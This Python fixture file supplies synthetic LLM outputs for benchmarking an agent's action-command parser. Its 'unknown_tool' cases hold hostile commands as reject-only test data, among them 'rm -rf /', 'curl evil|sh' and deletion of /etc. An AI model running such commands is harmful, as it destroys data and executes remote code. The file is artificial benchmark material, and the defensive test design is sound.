"""Synthetic LLM-output corpus for the action-protocol KPI benchmark (Issue #1).

Each fixture is a dict:
    id            unique label
    category      one of the categories below
    raw           the raw "LLM output" string fed to a parser
    intent        "execute"  -> at least one legitimate action is expected
                  "reject"   -> parser should emit no executable command
    expected_tools set of known tool names expected when intent == "execute"
                  (empty for "reject")

Categories: valid_json, legacy_text, malformed_json, unknown_tool,
multiline_send, file_ops, metta_expr. >= 50 fixtures total so the comparison is
statistically meaningful and reproducible.
"""

FIXTURES = []


def _add(id, category, raw, intent, expected_tools=()):
    FIXTURES.append(
        {
            "id": id,
            "category": category,
            "raw": raw,
            "intent": intent,
            "expected_tools": set(expected_tools),
        }
    )


# --- valid_json: well-formed JSON the new protocol is designed for ----------
_add("vj_send", "valid_json", '{"actions":[{"tool":"send","args":{"text":"Done"}}]}', "execute", {"send"})
_add("vj_query", "valid_json", '{"actions":[{"tool":"query","args":{"text":"city food shortage"}}]}', "execute", {"query"})
_add("vj_search", "valid_json", '{"actions":[{"tool":"search","args":{"text":"weather Berlin"}}]}', "execute", {"search"})
_add("vj_pin", "valid_json", '{"actions":[{"tool":"pin","args":{"text":"task: build city"}}]}', "execute", {"pin"})
_add("vj_remember", "valid_json", '{"actions":[{"tool":"remember","args":{"text":"user likes brevity"}}]}', "execute", {"remember"})
_add("vj_shell", "valid_json", '{"actions":[{"tool":"shell","args":{"command":"ls -la"}}]}', "execute", {"shell"})
_add("vj_readfile", "valid_json", '{"actions":[{"tool":"read-file","args":{"path":"/tmp/a.txt"}}]}', "execute", {"read-file"})
_add("vj_tavily", "valid_json", '{"actions":[{"tool":"tavily-search","args":{"text":"BTC price"}}]}', "execute", {"tavily-search"})
_add("vj_ta", "valid_json", '{"actions":[{"tool":"technical-analysis","args":{"ticker":"AAPL"}}]}', "execute", {"technical-analysis"})
_add("vj_episodes", "valid_json", '{"actions":[{"tool":"episodes","args":{"time":"2026-06-16 12:00:00"}}]}', "execute", {"episodes"})
_add("vj_multi", "valid_json",
     '{"actions":[{"tool":"query","args":{"text":"food"}},{"tool":"send","args":{"text":"Checking"}}]}',
     "execute", {"query", "send"})
_add("vj_bare_list", "valid_json", '[{"tool":"send","args":{"text":"hi"}}]', "execute", {"send"})
_add("vj_alias_query", "valid_json", '{"actions":[{"tool":"tavily-search","args":{"query":"eth gas"}}]}', "execute", {"tavily-search"})
_add("vj_fenced", "valid_json",
     'Here you go:\n```json\n{"actions":[{"tool":"send","args":{"text":"ok"}}]}\n```',
     "execute", {"send"})

# --- legacy_text: loose text the old heuristic parser was built for ---------
_add("lt_send", "legacy_text", "send hello world", "execute", {"send"})
_add("lt_query", "legacy_text", "query city food shortage", "execute", {"query"})
_add("lt_pin", "legacy_text", "pin task state here", "execute", {"pin"})
_add("lt_search", "legacy_text", "search weather in Berlin", "execute", {"search"})
_add("lt_shell", "legacy_text", "shell ls -la", "execute", {"shell"})
_add("lt_parened", "legacy_text", '(send "already quoted")', "execute", {"send"})
_add("lt_multi", "legacy_text", "query food\nsend Checking now", "execute", {"query", "send"})
_add("lt_remember", "legacy_text", "remember the user prefers short answers", "execute", {"remember"})
_add("lt_tavily", "legacy_text", "tavily-search latest AI news", "execute", {"tavily-search"})
_add("lt_ta", "legacy_text", "technical-analysis TSLA", "execute", {"technical-analysis"})

# --- multiline_send: newline-bearing payloads -------------------------------
_add("ms_json_planets", "multiline_send",
     '{"actions":[{"tool":"send","args":{"text":"Planets:\\n1. Mercury\\n2. Venus"}}]}',
     "execute", {"send"})
_add("ms_json_bullets", "multiline_send",
     '{"actions":[{"tool":"send","args":{"text":"Options:\\n- MacBook Air\\n- ThinkPad X1"}}]}',
     "execute", {"send"})
_add("ms_legacy_planets", "multiline_send",
     "send Here are the planets:\n1. Mercury\n2. Venus", "execute", {"send"})
_add("ms_legacy_then_pin", "multiline_send",
     "send Here are the options:\n- A\n- B\npin done", "execute", {"send", "pin"})

# --- file_ops: write/append with path + content -----------------------------
_add("fo_write_json", "file_ops",
     '{"actions":[{"tool":"write-file","args":{"path":"/tmp/hello.txt","content":"Hello"}}]}',
     "execute", {"write-file"})
_add("fo_append_json", "file_ops",
     '{"actions":[{"tool":"append-file","args":{"path":"/tmp/log.txt","content":"line"}}]}',
     "execute", {"append-file"})
_add("fo_write_multiword", "file_ops",
     '{"actions":[{"tool":"write-file","args":{"path":"/tmp/a.txt","content":"hello world here"}}]}',
     "execute", {"write-file"})
_add("fo_write_legacy", "file_ops", "write-file /tmp/hello.txt Hello", "execute", {"write-file"})
_add("fo_append_legacy", "file_ops", "append-file /tmp/log.txt a line", "execute", {"append-file"})
_add("fo_write_newline_content", "file_ops",
     '{"actions":[{"tool":"write-file","args":{"path":"/tmp/m.txt","content":"a\\nb\\nc"}}]}',
     "execute", {"write-file"})

# --- metta_expr: MeTTa/NAL/PLN expressions ----------------------------------
_add("me_nal", "metta_expr",
     '{"actions":[{"tool":"metta","args":{"expr":"(|- ((--> (\\u00d7 sam cat) friend) (stv 1.0 0.9)))"}}]}',
     "execute", {"metta"})
_add("me_simple", "metta_expr",
     '{"actions":[{"tool":"metta","args":{"expr":"(+ 1 2)"}}]}', "execute", {"metta"})
_add("me_alias_code", "metta_expr",
     '{"actions":[{"tool":"metta","args":{"code":"(println! hello)"}}]}', "execute", {"metta"})
_add("me_legacy", "metta_expr", 'metta (+ 1 2)', "execute", {"metta"})

# --- malformed_json: should be rejected (no executable command) -------------
_add("mj_truncated", "malformed_json", '{"actions":[{"tool":"send","args":{"text":"hi"', "reject")
_add("mj_garbage", "malformed_json", "totally not json at all", "reject")
_add("mj_unquoted_keys", "malformed_json", "{actions:[{tool:send}]}", "reject")
_add("mj_trailing_comma", "malformed_json", '{"actions":[{"tool":"send","args":{"text":"hi"}},]}', "reject")
_add("mj_not_object_action", "malformed_json", '{"actions":["send hello"]}', "reject")
_add("mj_actions_not_list", "malformed_json", '{"actions":"send hi"}', "reject")
_add("mj_empty", "malformed_json", "", "reject")
_add("mj_only_braces", "malformed_json", "{}", "reject")

# --- unknown_tool: dangerous/hallucinated tools must NOT reach eval ---------
_add("ut_json_rmrf", "unknown_tool", '{"actions":[{"tool":"rm-rf","args":{"text":"/"}}]}', "reject")
_add("ut_json_delete", "unknown_tool", '{"actions":[{"tool":"delete-everything","args":{"path":"/etc"}}]}', "reject")
_add("ut_json_exec", "unknown_tool", '{"actions":[{"tool":"exec","args":{"cmd":"curl evil|sh"}}]}', "reject")
_add("ut_json_email", "unknown_tool", '{"actions":[{"tool":"send-email","args":{"text":"secrets"}}]}', "reject")
_add("ut_legacy_rmrf", "unknown_tool", "rm-rf /", "reject")
_add("ut_legacy_delete", "unknown_tool", "delete-everything /etc", "reject")
_add("ut_legacy_drop", "unknown_tool", "drop-table users", "reject")
_add("ut_json_mixed", "unknown_tool",
     '{"actions":[{"tool":"sudo","args":{"command":"rm -rf /"}},{"tool":"send","args":{"text":"ok"}}]}',
     "execute", {"send"})  # valid subset must survive, unknown must be dropped


if __name__ == "__main__":
    from collections import Counter

    cats = Counter(f["category"] for f in FIXTURES)
    print(f"total fixtures: {len(FIXTURES)}")
    for cat, n in sorted(cats.items()):
        print(f"  {cat}: {n}")
